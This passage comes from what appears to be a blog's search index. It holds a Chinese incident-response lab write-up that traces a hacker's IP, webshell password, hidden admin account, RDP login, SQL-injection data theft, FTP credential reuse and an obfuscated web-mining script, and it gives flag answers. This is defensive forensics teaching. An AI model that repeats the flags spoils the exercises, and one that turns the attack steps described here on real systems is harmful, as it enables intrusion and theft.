class="line">请提交黑客的IP地址？</span><br></pre></td></tr></table></figure><p>可以由取证哪里知道ip，也可以看phpstudy，nginx日志</p><p>C:&#x2F;phpstudy&#x2F;log&#x2F;nginx_log</p><p><img src="/../images/image-20250729215152539.png" alt="image-20250729215152539"></p><h3 id="【任务3】应急大师"><a href="#【任务3】应急大师" class="headerlink" title="【任务3】应急大师"></a>【任务3】应急大师</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请提交黑客的一句话木马密码？</span><br></pre></td></tr></table></figure><p>可以由取证哪里知道密码，也可以看phpstudy下的文件</p><p>C:&#x2F;phpstudy&#x2F;WWW&#x2F;uploads&#x2F;</p><p><img src="/../images/image-20250729215449413.png" alt="image-20250729215449413"></p><h3 id="【任务4】应急大师"><a href="#【任务4】应急大师" class="headerlink" title="【任务4】应急大师"></a>【任务4】应急大师</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请提交黑客创建隐藏用户的TargetSid（目标账户安全ID）？</span><br></pre></td></tr></table></figure><p>wmic useraccount get name,sid</p><p><img src="/../images/image-20250729215809343.png" alt="image-20250729215809343"></p><h3 id="【任务5】应急大师"><a href="#【任务5】应急大师" class="headerlink" title="【任务5】应急大师"></a>【任务5】应急大师</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请提交黑客创建隐藏账户的事件（格式为 年/月/日 时:分:秒）？</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729220827054.png" alt="image-20250729220827054"></p><p>事件查看器搜创建新账户事件，ID为4720</p><h3 id="【任务6】应急大师"><a href="#【任务6】应急大师" class="headerlink" title="【任务6】应急大师"></a>【任务6】应急大师</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黑客将这个隐藏用户先后加入了哪几个用户组？提交格式为 第一个用户组-第二个用户组，如student-teacher</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">事件 ID 4728：用户被添加到一个全局安全组</span><br><span class="line">事件 ID 4732：用户被添加到一个本地安全组</span><br><span class="line">事件 ID 4756：用户被添加到一个通用安全组</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729221500496.png" alt="image-20250729221500496"></p><p><img src="/../images/image-20250729221517184.png" alt="image-20250729221517184"></p><p>先后被添加到Users、Administrators组</p><h3 id="【任务7】应急大师"><a href="#【任务7】应急大师" class="headerlink" title="【任务7】应急大师"></a>【任务7】应急大师</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黑客通过远程桌面成功登陆系统管理员账号的网络地址及端口号？提交格式为 IP:PORT 如 127.0.0.1:41110</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729221843353.png" alt="image-20250729221843353"></p><h2 id="题目信息—–公交车系统攻击事件排查"><a href="#题目信息—–公交车系统攻击事件排查" class="headerlink" title="题目信息—–公交车系统攻击事件排查"></a>题目信息—–公交车系统攻击事件排查</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">思而听公交系统被黑客攻击，黑客通过web进行了攻击并获取了数据，然后获取了其中一位驾校师傅在FTP服务中的私密文件，其后黑客找到了任意文件上传漏洞进行了GETshell，控制了主机权限并植入了挖矿网页挖矿病毒，接下来你需要逐步排查。</span><br></pre></td></tr></table></figure><h3 id="【任务1】公交车系统攻击事件排查"><a href="#【任务1】公交车系统攻击事件排查" class="headerlink" title="【任务1】公交车系统攻击事件排查"></a>【任务1】公交车系统攻击事件排查</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">分析环境内的中间件日志，找到第一个漏洞(黑客获取数据的漏洞)，然后通过分析日志、流量，通过脚本解出黑客获取的用户密码数据，提交获取的前两个用户名，提交格式：flag&#123;zhangsan-wangli&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729222756742.png" alt="image-20250729222756742"></p><p>进来就是一个流量包，发现是sql注入</p><p><img src="/../images/image-20250729225021003.png" alt="image-20250729225021003"></p><p>连数据库查，按password排序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br><span class="line">show databases;</span><br><span class="line">use bus_system</span><br><span class="line">select * from bus_drivers order by password;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729225151998.png" alt="image-20250729225151998"></p><p>flag{sunyue-chenhao}</p><h3 id="【任务2】公交车系统攻击事件排查"><a href="#【任务2】公交车系统攻击事件排查" class="headerlink" title="【任务2】公交车系统攻击事件排查"></a>【任务2】公交车系统攻击事件排查</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黑客通过获取的用户名密码，利用密码复用技术，爆破了FTP服务，分析流量以后找到开放的FTP端口，并找到黑客登录成功后获取的私密文件，提交其文件中内容，提交格式：flag&#123;xxx&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729230321641.png" alt="image-20250729230321641"></p><p>直接find搜索ftp，就出了</p><h3 id="【任务3】公交车系统攻击事件排查"><a href="#【任务3】公交车系统攻击事件排查" class="headerlink" title="【任务3】公交车系统攻击事件排查"></a>【任务3】公交车系统攻击事件排查</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可恶的黑客找到了任意文件上传点，你需要分析日志和流量以及web开放的程序找到黑客上传的文件，提交木马使用的密码，提交格式：flag&#123;password&#125;</span><br></pre></td></tr></table></figure><p>因为是文件上传，直接去找upload就好了</p><p><img src="/../images/image-20250729230656019.png" alt="image-20250729230656019"></p><h3 id="【任务4】公交车系统攻击事件排查"><a href="#【任务4】公交车系统攻击事件排查" class="headerlink" title="【任务4】公交车系统攻击事件排查"></a>【任务4】公交车系统攻击事件排查</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">分析流量，黑客植入了一个web挖矿木马，这个木马现实情况下会在用户访问后消耗用户的资源进行挖矿(本环境已做无害化处理)，提交黑客上传这个文件时的初始名称，提交格式：flag&#123;xxx.xxx&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729232809143.png" alt="image-20250729232809143"></p><p>直接解密webshell就ok了</p><p><img src="/../images/image-20250729234332101.png" alt="image-20250729234332101"></p><p>map.php</p><h3 id="【任务5】公交车系统攻击事件排查"><a href="#【任务5】公交车系统攻击事件排查" class="headerlink" title="【任务5】公交车系统攻击事件排查"></a>【任务5】公交车系统攻击事件排查</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">分析流量并上机排查，黑客植入的网页挖矿木马所使用的矿池地址是什么，提交矿池地址(排查完毕后可以尝试删除它)提交格式：flag&#123;xxxxxxx.xxxx.xxx:xxxx&#125;</span><br></pre></td></tr></table></figure><p>map.php变成了index.php，去检测一下index.php</p><p><img src="/../images/image-20250729234906085.png" alt="image-20250729234906085"></p><p>混淆js，解密就能获得</p><p>不会很懂加解密，给ai玩一会去</p>]]></content>
      
      
      <categories>
          
          <category> solar应急响应系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>link</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
